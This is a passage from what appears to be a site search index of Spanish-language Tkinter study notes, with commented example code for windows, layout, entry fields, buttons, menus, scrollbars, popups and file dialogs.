pack () Entry ( root , justify = \"center\" , textvariable = n2 ) . pack () # entrada numero 2 Label ( root , text = \"Resultado\" ) . pack () # Resultado desabilito la barra para que no nse pueda modificar Entry ( root , justify = \"center\" , textvariable = result , state = \"disabled\" ) . pack () # Botones que ejecutan la funcion indicada Label ( root , text = \"\" ) . pack () Button ( root , text = \"Sumar\" , command = sumar ) . pack ( side = \"left\" ) Button ( root , text = \"restar\" , command = restar ) . pack ( side = \"left\" ) Button ( root , text = \"multiplicar\" , command = multiplicar ) . pack ( side = \"left\" ) root . mainloop () Radiobutton Otro componente b\u00e1sico de los formularios son los botones radiales . Se utilizan cuando quieres ofrecerle al usuario la posibilidad de elegir una opci\u00f3n entre varias: En el siguiente ejemplo muestro un radiobutton de 3 opciones que modifican un label, mostrando la opci\u00f3n clicada y un bot\u00f3n de resetear opciones nulas. # Ventana de 3 radiobuttons donde muestro en un label el valor del button + un botton de reset del valor from tkinter import * def seleccionar (): monitor . config ( text = \" {} \" . format ( opcion . get ()) ) def reset (): opcion . set ( None ) monitor . config ( text = \"\" ) root = Tk () root . config ( bd = 10 ) opcion = IntVar () # opciones de butons que modifican variable opcion y ejecutan la funcion seleccionar # para mostrar valor en el monitor Radiobutton ( root , text = \"Opci\u00f3n 1\" , variable = opcion , value = 1 , command = seleccionar ) . pack () Radiobutton ( root , text = \"Opci\u00f3n 2\" , variable = opcion , value = 2 , command = seleccionar ) . pack () Radiobutton ( root , text = \"Opci\u00f3n 3\" , variable = opcion , value = 3 , command = seleccionar ) . pack () # label de monitor donde muestro valor de radiobuton monitor = Label ( root ) monitor . pack () Button ( root , text = \"Reset\" , command = reset ) . pack () root . mainloop () Checkbutton con radiobutton puedes marcar una entre varias opciones, con checkbutton se pueden marcar todas las opciones posibles que desees. En el siguiente ejemplo se ve dos opciones a a\u00f1adir como quieres el caf\u00e9. Checkbutton siempre tendr\u00e1 2 opciones onvalue el valor seleccionado y offvalue valor sin seleccionar. from tkinter import * root = Tk () root . config ( bd = 15 ) leche = IntVar () # 1 si, 0 no azucar = IntVar () # 1 si, 0 no Label ( root , text = \"\u00bfC\u00f3mo quieres el caf\u00e9?\" ) . pack () Checkbutton ( root , text = \"Con leche\" , variable = leche , onvalue = 1 , offvalue = 0 ) . pack () Checkbutton ( root , text = \"Con az\u00facar\" , variable = leche , onvalue = 1 , offvalue = 0 ) . pack () root . mainloop () En el siguiente ejemplo muestro como recoger las variables de checkbutton, desde una funci\u00f3n donde se modificara un label para mostrar como quieres el caf\u00e9, ademas introduzco una imagen alineada a la izquierda. # ventana donde muestra una imagen con dos opciones tipo checkbutton que modifican el texto de un label from tkinter import * # funcion donde a\u00f1ade el texto a la label monitor def seleccionar (): cadena = \"\" if leche . get (): cadena += \"Con leche\" else : cadena += \"Sin leche\" if azucar . get (): cadena += \" y con az\u00facar\" else : cadena += \" y sin az\u00facar\" monitor . config ( text = cadena ) root = Tk () root . title ( \"Cafeter\u00eda\" ) root . config ( bd = 10 ) leche = IntVar () # 1 si, 0 no azucar = IntVar () # imagen de un cafecito muy gracioso alineado a la derecha imagen = PhotoImage ( file = \"imagen.gif\" ) Label ( root , image = imagen ) . pack ( side = \"left\" ) # Frame donde enpaqueto los radiobuttons y su texto modificable frame = Frame ( root ) frame . pack ( side = \"left\" ) # Botton alineado a la izquierda, con su valor de variables asignados si estan seleccionados o no # ademas ejecutan la funci\u00f3n seleccionar Label ( frame , text = \"\u00bfC\u00f3mo quieres el caf\u00e9?\" ) . pack ( anchor = \"w\" ) Checkbutton ( frame , text = \"Con leche\" , variable = leche , onvalue = 1 , offvalue = 0 , command = seleccionar ) . pack ( anchor = \"w\" ) Checkbutton ( frame , text = \"Con az\u00facar\" , variable = azucar , onvalue = 1 , offvalue = 0 , command = seleccionar ) . pack ( anchor = \"w\" ) # Label donde muestro el texto que modifican los botones monitor = Label ( frame ) monitor . pack () root . mainloop () Men\u00fas Men\u00fa en la barra superior de toda la vida. from tkinter import * root = Tk () menubar = Menu ( root ) root . config ( menu = menubar ) # Lo asigno a la base ( creo la barra ) # asigno menus iniciales filemenu = Menu ( menubar , tearoff = 0 ) editmenu = Menu ( menubar , tearoff = 0 ) helpmenu = Menu ( menubar , tearoff = 0 ) # los a\u00f1ado a la barra menubar . add_cascade ( label = \"Archivo\" , menu = filemenu ) menubar . add_cascade ( label = \"Editar\" , menu = editmenu ) menubar . add_cascade ( label = \"Ayuda\" , menu = helpmenu ) root . mainloop () Esto seria el men\u00fa m\u00e1s b\u00e1sico, lo malo es que no hacen nada de momento. En el siguiente ejemplo a\u00f1ado submenus a cada men\u00fa, y a la opci\u00f3n salir le asigno un comando para cerrar el programa. from tkinter import * root = Tk () # barra de menu principal menubar = Menu ( root ) root . config ( menu = menubar ) # Primeras opciones de menu filemenu = Menu ( menubar , tearoff = 0 ) # submenus del menu archivo filemenu . add_command ( label = \"Nuevo\" ) filemenu . add_command ( label = \"Abrir\" ) filemenu . add_command ( label = \"Guardar\" ) filemenu . add_command ( label = \"Cerrar\" ) # barra separadora filemenu . add_separator () # anado un comando al submenu para salir filemenu . add_command ( label = \"Salir\" , command = root . quit ) # menu editar editmenu = Menu ( menubar , tearoff = 0 ) editmenu . add_command ( label = \"Cortar\" ) editmenu . add_command ( label = \"Copiar\" ) editmenu . add_command ( label = \"Pegar\" ) # menu ayuda helpmenu = Menu ( menubar , tearoff = 0 ) helpmenu . add_command ( label = \"Ayuda\" ) helpmenu . add_separator () helpmenu . add_command ( label = \"Acerca de....\" ) # a\u00f1ado los menus a la barra de menus menubar . add_cascade ( label = \"Archivo\" , menu = filemenu ) menubar . add_cascade ( label = \"Editar\" , menu = editmenu ) menubar . add_cascade ( label = \"Ayuda\" , menu = helpmenu ) root . mainloop () Progressbar # progressbar = ttk.Progressbar(actualizar, orient='horizontal', mode='indeterminate') # # progressbar.step(50) # progressbar.pack(fill='x') Subprocesos process = subprocess . Popen ( instalador . get () + \" update\" , shell = True , stdout = subprocess . PIPE , stderr = subprocess . STDOUT ) while True : out = process . stdout . readline () if out == '' or process . poll () is not None : #if out == '' and process.poll() is not None: break print ( out ) a_texto . insert ( \"end\" , out ) a_texto . see ( \"end\" ) a_texto . update_idletasks () Scrollbar frame1 = Frame ( condiciones ) frame1 . pack ( anchor = 'center' ) scrollbar = Scrollbar ( frame1 ) scrollbar . pack ( side = \"right\" , fill = \"y\" ) c_texto = Text ( frame1 , yscrollcommand = scrollbar . set ) for line in range ( 100 ): c_texto . insert ( END , \"This is line number \" + str ( line ) + \" \\n \" ) c_texto . pack () scrollbar . config ( command = c_texto . yview ) # por defecto scroll abajo # c_texto.yview_moveto(1) Popups Popups vantanas de alertas, existen diferentes tipo de ventanas: iformacion, warning, error, la utilidad simple aceptar o denegar una acci\u00f3n. from tkinter import * from tkinter import messagebox as Messagebox root = Tk () def test (): # Mensages simples de mostrar info, alertas, errores personalizable # Messagebox.showinfo(\"Titulo de ventana\",\"Hola mundo\") # Messagebox.showwarning(\"Alerta\",\"Alerta solo administradores.\") # Messagebox.showerror(\"Error!\",\"Ha ocurrido un error\") # Mensages para realizar una accion # Opciones si y no # resultado = Messagebox.askquestion(\"Salir\",\"\u00bfEstas seguro de salir?\") # if resultado == \"yes\": # \"no\" # root.destroy() # Opciones si y no # resultado = Messagebox.askyesno(\"Salir\",\"\u00bfEstas seguro de salir?\") # if resultado: # \"True or False\" # root.destroy() # Opciones ACEPT cancel # resultado = Messagebox.askokcancel(\"Salir\",\"\u00bfSobreescribir el fichero actual?\") # if resultado: # \"True or False\" # root.destroy() # Opciones retry cancel resultado = Messagebox . askretrycancel ( \"Reintentar\" , \"No se a podido conectar\" ) if resultado : # \"True or False\" root . destroy () Button ( root , text = \"Clicame\" , command = test ) . pack () root . mainloop () Avanzados diferentes popups para seleccionar color, obtener ruta de archivo para abrir o guardar un archivo. from tkinter import * from tkinter import messagebox as Messagebox from tkinter import colorchooser as Colorchooser from tkinter import filedialog as Filedialog root = Tk () def test (): # Colorchooser abre un popup donde puedes elejir un color en una tabla de colorchooser # en terminal devuelve una tupla con el codigo en rgk y hexadewcimal # ((96.375, 161.62890625, 144.5625), '#60a190') # color = Colorchooser.askcolor(title=\"Elige un color\") # print(color) # Filedialog.askopenfilename obtiene la ruta de un archivo mediante un popup # initialdir indica la ruta donde se abrira el popup ( cuidado segun el sistema operativo ) # filetypes para filtrar entre diferentes ficheros # ruta = Filedialog.askopenfilename(title=\"Abrir un fichero\", initialdir=\"/home\", # filetypes=((\"Fichero de texto\",\"*.txt\"), # (\"Fichero de texto avanzado\",\"*.odt\"), # (\"Todos los ficheros\",\"*.*\")) ) # print(ruta) # Filedialog.asksaveasfile guarda un archivo hay que jugar con el mode segun que quieras hacer fichero = Filedialog . asksaveasfile ( title = \"Guardar un fichero\" , mode = \"w\" , defaultextension = \".txt\" ) if fichero is not None : fichero . write ( \"Hola!\" ) fichero . close () Button ( root , text = \"Clicame\" , command = test ) . pack () root . mainloop ()","title":"Tkinter"},{"location":"lenguajes/python3/apuntes-tkinter/#tkinter","text":"Tkinter es una libreria de python para crear programas con interficies graficas. !> Los programas se crean en archivos *.py , al ejecutarse se abre una terminal m\u00e1s el programa. Para evitar eso lo guardare en *.pyw , as\u00ed solo abrira el programa.","title":"Tkinter"},{"location":"lenguajes/python3/apuntes-tkinter/#raiz","text":"Es la ventana principal del programa. from tkinter import * # creo la raiz root = Tk () # Titulo root . title ( \"Hola mundo\" ) # bucle mantiene la app ( siempre abajo del todo ) root . mainloop ()","title":"Raiz"},{"location":"lenguajes/python3/apuntes-tkinter/#resizable","text":"Permite establecer los parametros de agrandar o enpeque\u00f1ecer la ventna o simplemente dejarla fija. # Poder agrandar ventana (anchura, altura) 0 = false, 1 = true root . resizable ( 1 , 1 ) # 1,1 movible. 0,0 fija","title":"Resizable"},{"location":"lenguajes/python3/apuntes-tkinter/#iconbitmap","text":"A\u00f1ade un icono en la ventana root . iconbitmap ( '@hola.xbm' ) Ejemplo configurando lo mas b\u00e1sico, la raiz con un titulo y ventana redimensionable. tk.py from tkinter import * # creo la raiz root = Tk () # Titulo root . title ( \"Hola mundo\" ) # Poder agrandar ventana (anchura, altura) 0 = false, 1 = true root . resizable ( 1 , 1 ) # bucle mantiene la app ( siempre abajo del todo ) root . mainloop () As\u00ed se muestra de tk.pyw","title":"Iconbitmap"},{"location":"lenguajes/python3/apuntes-tkinter/#frame-marco","text":"Los frames son marcos contenedores de otros widgets. Pueden tener tama\u00f1o propio y posicionarse en distintos lugares de otro contenedor ( ya sea la raiz u otro marco ). from tkinter import * root = Tk () # Hijo de root, no ocurre nada frame = Frame ( root ) # Empaqueta el frame en la ra\u00edz frame . pack () # Como no tenemos ning\u00fan elemento dentro del frame, # no tiene tama\u00f1o y aparece ocupando lo m\u00ednimo posible, 0*0 px # Color de fondo, background frame . config ( bg = \"lightblue\" ) # Podemos establecer un tama\u00f1o, # la ra\u00edz se adapta al frame que contiene frame . config ( width = 480 , height = 320 ) root . mainloop ()","title":"Frame (Marco)"},{"location":"lenguajes/python3/apuntes-tkinter/#conf-estilismo","text":"config a\u00f1ade distintas configuraciones al los frames o la ra\u00edz. . config ( width = 480 , height = 320 ) # Podemos establecer un tama\u00f1o . config ( cursor = \"\" ) # Tipo de cursor . config ( relief = \"sunken\" ) # relieve del frame hundido . config ( bd = 25 ) # tama\u00f1o del borde en p\u00edxeles . config ( bg = \"blue\" ) # color de fondo, background . config ( cursor = \"pirate\" ) # tipo de cursor (arrow defecto) . config ( relief = \"sunken\" ) # relieve del root . config ( bd = 25 ) # tama\u00f1o del borde en p\u00edxeles . config ( font = ( \"Consolas\" , 24 )) # tipo de letra . config ( fg = 'blue' ) # color de letra . config ( padx = 10 ) # padding x . config ( pady = 10 ) # padding y","title":".Conf (Estilismo)"},{"location":"lenguajes/python3/apuntes-tkinter/#pack-posicionamiento","text":"Pack() enpaqueta los frames y los muestra en la ventana. frame . pack ( side = \"right\" ) # a la derecha al medio frame . pack ( anchor = \"se\" ) # sudeste, abajo a la derecha frame . pack ( fill = \"x\" ) # ancho como el padre frame . pack ( fill = \"y\" ) # alto como el padre frame . pack ( fill = \"both\" ) # ambas opciones frame . pack ( fill = \"both\" , expand = 1 ) # expandirse para ocupar el espacio Ejemplo empacando frame en sud-este de la raiz. from tkinter import * root = Tk () # RAIZ root . title ( \"Hola mundo\" ) # Titulo # Poder agrandar ventana (anchura, altura) 0 = false, 1 = true root . resizable ( 1 , 1 ) # Frame ( Marco ) frame = Frame ( root ) frame . pack ( side = 'right' , anchor = 'se' ) # pegado a la derecha y posici\u00f3n se # lo mas abitual es utilizat (fill='both', expand=1) adaptarse a la ventana. frame . config ( width = 280 , height = 120 ) # tama\u00f1o inicial frame . config ( bg = \"lightblue\" ) # fondo frame . config ( bd = 10 ) # borde frame . config ( relief = \"sunken\" ) # stilo de borde frame . config ( cursor = \"pirate\" ) # cambio de cursor # bucle aplicaci\u00f3n root . mainloop ()","title":".Pack (Posicionamiento)"},{"location":"lenguajes/python3/apuntes-tkinter/#label","text":"El widget Label se utiliza para mostrar textos, suelen ser est\u00e1ticos de ah\u00ed su nombre. from tkinter import * root = Tk () frame = Frame ( root ) frame . pack () label = Label ( frame , text = \"\u00a1Hola Mundo!\" ) label . pack () root . mainloop () Creando m\u00e1s etiquetas. from tkinter import * root = Tk () Label ( root , text = \"\u00a1Hola Mundo!\" ) . pack () Label ( root , text = \"\u00a1Otra etiqueta!\" ) . pack () Label ( root , text = \"\u00a1\u00daltima etiqueta!\" ) . pack () root . mainloop () Posicionando etiquetas. Label ( root , text = \"\u00a1Hola Mundo!\" ) . pack ( anchor = 'nw' ) Label ( root , text = \"\u00a1Otra etiqueta!\" ) . pack ( anchor = 'center' ) Label ( root , text = \"\u00a1\u00daltima etiqueta!\" ) . pack ( anchor = 'se' ) Label ( root , text = \"\u00a1Hola mundo!\" ) . place ( x = 10 , y = 10 ) # x, y cordenadas place posiciona por coordenadas respecto al padre.","title":"Label"},{"location":"lenguajes/python3/apuntes-tkinter/#texto-en-variable","text":"# # variable dinamica texto = StringVar () texto . set ( \"un nuevo texto\" ) # texto nuevo label = Label ( root , text = \"Linea inicial del texto\" ) label . pack ( anchor = \"center\" ) # Cambio el texto a el label label . config ( textvariable = texto ) Es un ejemplo un poco absurdo, pero quer\u00eda remarcar que el texto se puede asignar a una variable.","title":"Texto en variable"},{"location":"lenguajes/python3/apuntes-tkinter/#imagen","text":"# A\u00f1adir imagen imagen = PhotoImage ( file = \"hola.png\" ) # acepta .png y .gif Label ( root , image = imagen , bd = 0 ) . pack () Para trabajar con otro tipo de formato se a de trabajar con un m\u00f3dulo externo como PIL.","title":"Imagen"},{"location":"lenguajes/python3/apuntes-tkinter/#entry","text":"Widget Entry (texto corto), son lo que en python un input() donde el usuario inserta un peque\u00f1o campo de texto. from tkinter import * root = Tk () # Entrada de texto, un input Entry ( root ) . pack ( side = \"right\" ) # label del campo de texto Label ( root , text = \"Nombre\" ) . pack ( side = \"left\" ) root . mainloop () En el caso anterior si a\u00f1adiera otro campo de texto se mostrar\u00eda en la misma l\u00ednea, eso pasa porque pack() intenta alinear autom\u00e1ticamente, pero no hace milagros. Para solucionarlo creo 2 frames ( marcos) en cada uno de ellos ira su campo de texto as\u00ed se mostraran en 2 lineas # marco 1 linea 1 frame = Frame ( root ) frame . pack () # Entrada de texto, un input 1 entry = Entry ( frame ) entry . pack ( side = \"right\" ) # label del campo de texto 2 label1 = Label ( frame , text = \"Nombre\" ) label1 . pack ( side = \"left\" ) # marco 2 linea 2 frame2 = Frame ( root ) frame2 . pack () # Entrada de texto, un input 2 entry2 = Entry ( frame2 ) entry2 . pack ( side = \"right\" ) # label del campo de texto 2 label2 = Label ( frame2 , text = \"Apellido\" ) label2 . pack ( side = \"left\" ) Aun as\u00ed como nombre y apellidos no tienen los mismos caracteres no queda perfecto, utilizare .grid() para alinear como si fuera una tabla.","title":"Entry"},{"location":"lenguajes/python3/apuntes-tkinter/#grid-tabla","text":"Widget Grid simula una tabla para poder encuadrar, obviamente tiene configuraciones propias . . grid ( row = 0 ) # numero de fila . grid ( column = 0 ) # numero de columna . grid ( sticky = 'w' ) # pegado e, s, w, o . grid ( state = 'disabled' ) # estado disable, normal . grid ( show = '*' ) # muestra, para contrase\u00f1as . grid ( justify = 'center' ) #justifica el texto. center, left, right Padding es un par\u00e1metro que esta en todos los widgets. . grid ( padx = 5 ) # pading vertical . grid ( pady = 5 ) # pading horizontal Ejemplo de dos entradas bien alineadas con grid. from tkinter import * root = Tk () # label del campo de texto 1 label1 = Label ( root , text = \"Nombre\" ) label1 . grid ( row = 0 , column = 0 , sticky = \"w\" , padx = 5 , pady = 5 ) # campo de texto 1 entry = Entry ( root ) entry . grid ( row = 0 , column = 1 , padx = 5 , pady = 5 ) # Puedo justificar el texto del input para que vempiece a escribir desde centro derecha o izquierda con justify # O desabilitar el campo con state \"disable\" o \"normal\" entry . config ( justify = \"right\" , state = \"disable\" ) # label del campo de texto 2 label2 = Label ( root , text = \"Contrase\u00f1a\" ) label2 . grid ( row = 1 , column = 0 , sticky = \"w\" , padx = 5 , pady = 5 ) # campo de texto 2 entry2 = Entry ( root ) entry2 . grid ( row = 1 , column = 1 , padx = 5 , pady = 5 ) # Tambi\u00e9n puedo mostrar un caracter especial mientras escribes una contrase\u00f1a entry2 . config ( justify = \"center\" , show = \"*\" ) root . mainloop ()","title":".grid (tabla)"},{"location":"lenguajes/python3/apuntes-tkinter/#text-texto-largo","text":"Se explica por si solo, un campo de texto donde puedes escribir tanto como te venga en gana. from tkinter import * root = Tk () texto = Text ( root ) texto . pack () root . mainloop () Por defecto ocupa un espacio predefinido, pero puedes definir un tama\u00f1o concreto y alguna que otra configuraci\u00f3n. texto . config ( width = 50 , height = 10 ) # tama\u00f1o en caracteres texto . config ( font = ( \"Consolas\" , 12 )) # fuente texto . config ( padx = 10 , pady = 10 ) # padding, para que el texto no este muy al borde texto . config ( selectbackground = \"orange\" ) # color de selecci\u00f3n del texto Ejemplo campo de texto. from tkinter import * root = Tk () # asigno Text a una variable para poder configurar facilmente texto = Text ( root ) texto . pack () texto . config ( width = 50 , height = 10 ) # width=50 es igual a 50 caracteres de ancho, no pixeles texto . config ( font = ( \"Consolas\" , 12 )) # Cambio fuente del campo texto . config ( padx = 10 , pady = 10 ) # le a\u00f1ado un pading texto . config ( selectbackground = \"orange\" ) # Cambio el color de selecci\u00f3n del texto root . mainloop ()","title":"Text ( texto largo )"},{"location":"lenguajes/python3/apuntes-tkinter/#button","text":"Un bot\u00f3n clicable que se le puede asignar una acci\u00f3n. from tkinter import * # Definimos una funci\u00f3n a ejecutar al clic el bot\u00f3n def hola (): print ( \"Hola mundo!\" ) root = Tk () # Enlezamos la funci\u00f3n a la acci\u00f3n del bot\u00f3n Button ( root , text = \"Cl\u00edcame\" , command = hola ) . pack () root . mainloop () El concepto es muy simple, pero es algo muy \u00fatil en interficies gr\u00e1ficas. El siguiente c\u00f3digo es de una calculadora muy salchichera, como ejemplo es v\u00e1lido. # calculadora cutre que suma, resta o multiplica 2 n\u00fameros from tkinter import * # funciones que hacen las operaci\u00f3nes y asignan el resultado. # Al recibir estrings los calculo cambiando la variable a float def sumar (): result . set ( float ( n1 . get ()) + float ( n2 . get ()) ) borrar () def restar (): result . set ( float ( n1 . get ()) - float ( n2 . get ()) ) borrar () def multiplicar (): result . set ( float ( n1 . get ()) * float ( n2 . get ()) ) borrar () # funcion donde borro los strings de las barras def borrar (): n1 . set ( \"\" ) n2 . set ( \"\" ) root = Tk () # A\u00f1ado borde al frame de root por mejorar apariencia root . config ( bd = 15 ) n1 = StringVar () n2 = StringVar () result = StringVar () Label ( root , text = \"N\u00famero 1\" ) . pack () Entry ( root , justify = \"center\" , textvariable = n1 ) . pack () # entrada numero 1 Label ( root , text = \"N\u00famero 2\" ) . pack () Entry ( root , justify = \"center\" , textvariable = n2 ) . pack () # entrada numero 2 Label ( root , text = \"Resultado\" ) . pack () # Resultado desabilito la barra para que no nse pueda modificar Entry ( root , justify = \"center\" , textvariable = result , state = \"disabled\" ) . pack () # Botones que ejecutan la funcion indicada Label ( root , text = \"\" ) . pack () Button ( root , text = \"Sumar\" , command = sumar ) . pack ( side = \"left\" ) Button ( root , text = \"restar\" , command = restar ) . pack ( side = \"left\" ) Button ( root , text = \"multiplicar\" , command = multiplicar ) . pack ( side = \"left\" ) root . mainloop ()","title":"Button"},{"location":"lenguajes/python3/apuntes-tkinter/#radiobutton","text":"Otro componente b\u00e1sico de los formularios son los botones radiales . Se utilizan cuando quieres ofrecerle al usuario la posibilidad de elegir una opci\u00f3n entre varias: En el siguiente ejemplo muestro un radiobutton de 3 opciones que modifican un label, mostrando la opci\u00f3n clicada y un bot\u00f3n de resetear opciones nulas. # Ventana de 3 radiobuttons donde muestro en un label el valor del button + un botton de reset del valor from tkinter import * def seleccionar (): monitor . config ( text = \" {} \" . format ( opcion . get ()) ) def reset (): opcion . set ( None ) monitor . config ( text = \"\" ) root = Tk () root . config ( bd = 10 ) opcion = IntVar () # opciones de butons que modifican variable opcion y ejecutan la funcion seleccionar # para mostrar valor en el monitor Radiobutton ( root , text = \"Opci\u00f3n 1\" , variable = opcion , value = 1 , command = seleccionar ) . pack () Radiobutton ( root , text = \"Opci\u00f3n 2\" , variable = opcion , value = 2 , command = seleccionar ) . pack () Radiobutton ( root , text = \"Opci\u00f3n 3\" , variable = opcion , value = 3 , command = seleccionar ) . pack () # label de monitor donde muestro valor de radiobuton monitor = Label ( root ) monitor . pack () Button ( root , text = \"Reset\" , command = reset ) . pack () root . mainloop ()","title":"Radiobutton"},{"location":"lenguajes/python3/apuntes-tkinter/#checkbutton","text":"con radiobutton puedes marcar una entre varias opciones, con checkbutton se pueden marcar todas las opciones posibles que desees. En el siguiente ejemplo se ve dos opciones a a\u00f1adir como quieres el caf\u00e9. Checkbutton siempre tendr\u00e1 2 opciones onvalue el valor seleccionado y offvalue valor sin seleccionar. from tkinter import * root = Tk () root . config ( bd = 15 ) leche = IntVar () # 1 si, 0 no azucar = IntVar () # 1 si, 0 no Label ( root , text = \"\u00bfC\u00f3mo quieres el caf\u00e9?\" ) . pack () Checkbutton ( root , text = \"Con leche\" , variable = leche , onvalue = 1 , offvalue = 0 ) . pack () Checkbutton ( root , text = \"Con az\u00facar\" , variable = leche , onvalue = 1 , offvalue = 0 ) . pack () root . mainloop () En el siguiente ejemplo muestro como recoger las variables de checkbutton, desde una funci\u00f3n donde se modificara un label para mostrar como quieres el caf\u00e9, ademas introduzco una imagen alineada a la izquierda. # ventana donde muestra una imagen con dos opciones tipo checkbutton que modifican el texto de un label from tkinter import * # funcion donde a\u00f1ade el texto a la label monitor def seleccionar (): cadena = \"\" if leche . get (): cadena += \"Con leche\" else : cadena += \"Sin leche\" if azucar . get (): cadena += \" y con az\u00facar\" else : cadena += \" y sin az\u00facar\" monitor . config ( text = cadena ) root = Tk () root . title ( \"Cafeter\u00eda\" ) root . config ( bd = 10 ) leche = IntVar () # 1 si, 0 no azucar = IntVar () # imagen de un cafecito muy gracioso alineado a la derecha imagen = PhotoImage ( file = \"imagen.gif\" ) Label ( root , image = imagen ) . pack ( side = \"left\" ) # Frame donde enpaqueto los radiobuttons y su texto modificable frame = Frame ( root ) frame . pack ( side = \"left\" ) # Botton alineado a la izquierda, con su valor de variables asignados si estan seleccionados o no # ademas ejecutan la funci\u00f3n seleccionar Label ( frame , text = \"\u00bfC\u00f3mo quieres el caf\u00e9?\" ) . pack ( anchor = \"w\" ) Checkbutton ( frame , text = \"Con leche\" , variable = leche , onvalue = 1 , offvalue = 0 , command = seleccionar ) . pack ( anchor = \"w\" ) Checkbutton ( frame , text = \"Con az\u00facar\" , variable = azucar , onvalue = 1 , offvalue = 0 , command = seleccionar ) . pack ( anchor = \"w\" ) # Label donde muestro el texto que modifican los botones monitor = Label ( frame ) monitor . pack () root . mainloop ()","title":"Checkbutton"},{"location":"lenguajes/python3/apuntes-tkinter/#menus","text":"Men\u00fa en la barra superior de toda la vida. from tkinter import * root = Tk () menubar = Menu ( root ) root . config ( menu = menubar ) # Lo asigno a la base ( creo la barra ) # asigno menus iniciales filemenu = Menu ( menubar , tearoff = 0 ) editmenu = Menu ( menubar , tearoff = 0 ) helpmenu = Menu ( menubar , tearoff = 0 ) # los a\u00f1ado a la barra menubar . add_cascade ( label = \"Archivo\" , menu = filemenu ) menubar . add_cascade ( label = \"Editar\" , menu = editmenu ) menubar . add_cascade ( label = \"Ayuda\" , menu = helpmenu ) root . mainloop () Esto seria el men\u00fa m\u00e1s b\u00e1sico, lo malo es que no hacen nada de momento. En el siguiente ejemplo a\u00f1ado submenus a cada men\u00fa, y a la opci\u00f3n salir le asigno un comando para cerrar el programa. from tkinter import * root = Tk () # barra de menu principal menubar = Menu ( root ) root . config ( menu = menubar ) # Primeras opciones de menu filemenu = Menu ( menubar , tearoff = 0 ) # submenus del menu archivo filemenu . add_command ( label = \"Nuevo\" ) filemenu . add_command ( label = \"Abrir\" ) filemenu . add_command ( label = \"Guardar\" ) filemenu . add_command ( label = \"Cerrar\" ) # barra separadora filemenu . add_separator () # anado un comando al submenu para salir filemenu . add_command ( label = \"Salir\" , command = root . quit ) # menu editar editmenu = Menu ( menubar , tearoff = 0 ) editmenu . add_command ( label = \"Cortar\" ) editmenu . add_command ( label = \"Copiar\" ) editmenu . add_command ( label = \"Pegar\" ) # menu ayuda helpmenu = Menu ( menubar , tearoff = 0 ) helpmenu . add_command ( label = \"Ayuda\" ) helpmenu . add_separator () helpmenu . add_command ( label = \"Acerca de....\" ) # a\u00f1ado los menus a la barra de menus menubar . add_cascade ( label = \"Archivo\" , menu = filemenu ) menubar . add_cascade ( label = \"Editar\" , menu = editmenu ) menubar . add_cascade ( label = \"Ayuda\" , menu = helpmenu ) root . mainloop ()","title":"Men\u00fas"},{"location":"lenguajes/python3/apuntes-tkinter/#progressbar","text":"# progressbar = ttk.Progressbar(actualizar, orient='horizontal', mode='indeterminate') # # progressbar.step(50) # progressbar.pack(fill='x')","title":"Progressbar"},{"location":"lenguajes/python3/apuntes-tkinter/#subprocesos","text":"process = subprocess . Popen ( instalador . get () + \" update\" , shell = True , stdout = subprocess . PIPE , stderr = subprocess . STDOUT ) while True : out = process . stdout . readline () if out == '' or process . poll () is not None : #if out == '' and process.poll() is not None: break print ( out ) a_texto . insert ( \"end\" , out ) a_texto . see ( \"end\" ) a_texto . update_idletasks ()","title":"Subprocesos"},{"location":"lenguajes/python3/apuntes-tkinter/#scrollbar","text":"frame1 = Frame ( condiciones ) frame1 . pack ( anchor = 'center' ) scrollbar = Scrollbar ( frame1 ) scrollbar . pack ( side = \"right\" , fill = \"y\" ) c_texto = Text ( frame1 , yscrollcommand = scrollbar . set ) for line in range ( 100 ): c_texto . insert ( END , \"This is line number \" + str ( line ) + \" \\n \" ) c_texto . pack () scrollbar . config ( command = c_texto . yview ) # por defecto scroll abajo # c_texto.yview_moveto(1)","title":"Scrollbar"},{"location":"lenguajes/python3/apuntes-tkinter/#popups","text":"Popups vantanas de alertas, existen diferentes tipo de ventanas: iformacion, warning, error, la utilidad simple aceptar o denegar una acci\u00f3n. from tkinter import * from tkinter import messagebox as Messagebox root = Tk () def test (): # Mensages simples de mostrar info, alertas, errores personalizable # Messagebox.showinfo(\"Titulo de ventana\",\"Hola mundo\") # Messagebox.showwarning(\"Alerta\",\"Alerta solo administradores.\") # Messagebox.showerror(\"Error!\",\"Ha ocurrido un error\") # Mensages para realizar una accion # Opciones si y no # resultado = Messagebox.askquestion(\"Salir\",\"\u00bfEstas seguro de salir?\") # if resultado == \"yes\": # \"no\" # root.destroy() # Opciones si y no # resultado = Messagebox.askyesno(\"Salir\",\"\u00bfEstas seguro de salir?\") # if resultado: # \"True or False\" # root.destroy() # Opciones ACEPT cancel # resultado = Messagebox.askokcancel(\"Salir\",\"\u00bfSobreescribir el fichero actual?\") # if resultado: # \"True or False\" # root.destroy() # Opciones retry cancel resultado = Messagebox . askretrycancel ( \"Reintentar\" , \"No se a podido conectar\" ) if resultado : # \"True or False\" root . destroy () Button ( root , text = \"Clicame\" , command = test ) . pack () root . mainloop ()","title":"Popups"},{"location":"lenguajes/python3/apuntes-tkinter/#avanzados","text":"diferentes popups para seleccionar color, obtener ruta de archivo para abrir o guardar un archivo. from tkinter import * from tkinter import messagebox as Messagebox from tkinter import colorchooser as Colorchooser from tkinter import filedialog as Filedialog root = Tk () def test (): # Colorchooser abre un popup donde puedes elejir un color en una tabla de colorchooser # en terminal devuelve una tupla con el codigo en rgk y hexadewcimal # ((96.375, 161.62890625, 144.5625), '#60a190') # color = Colorchooser.askcolor(title=\"Elige un color\") # print(color) # Filedialog.askopenfilename obtiene la ruta de un archivo mediante un popup # initialdir indica la ruta donde se abrira el popup ( cuidado segun el sistema operativo ) # filetypes para filtrar entre diferentes ficheros # ruta = Filedialog.askopenfilename(title=\"Abrir un fichero\", initialdir=\"/home\", # filetypes=((\"Fichero de texto\",\"*.txt\"), # (\"Fichero de texto avanzado\",\"*.odt\"), # (\"Todos los ficheros\",\"*.*\")) ) # print(ruta) # Filedialog.asksaveasfile guarda un archivo hay que jugar con el mode segun que quieras hacer fichero = Filedialog . asksaveasfile ( title = \"Guardar un fichero\" , mode = \"w\" , defaultextension = \".txt\" ) if fichero is not None : fichero . write ( \"Hola!\" ) fichero . close () Button ( root , text = \"Clicame\" , command = test ) . pack () root . mainloop ()","title":"Avanzados"},{"location":"lenguajes/python3/apuntes_bases/","text":"Base de datos En las conexiones a bases de datos desde python se siguen 4 pasos muy simples. import importar el modulo de la base de datos especifica connect establecer la conexi\u00f3n con la base de datos execute ejecutar el commando que uno quiere introducir close cerrar la 